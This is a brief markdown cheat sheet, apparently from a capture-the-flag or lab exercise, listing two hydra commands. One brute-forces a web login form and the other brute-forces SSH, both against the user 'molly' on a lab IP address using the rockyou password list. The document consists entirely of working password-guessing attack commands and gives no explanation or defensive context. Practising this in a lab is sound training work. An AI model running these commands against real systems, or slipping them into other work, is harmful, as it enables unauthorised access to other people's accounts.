
### Bruteforce a login form
```bash
hydra -l molly -P Downloads/rockyou.txt 10.10.61.210 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
```

### bruteforce SSH

```bash
hydra -l molly -P Downloads/rockyou.txt 10.10.61.210 ssh -V -I
```
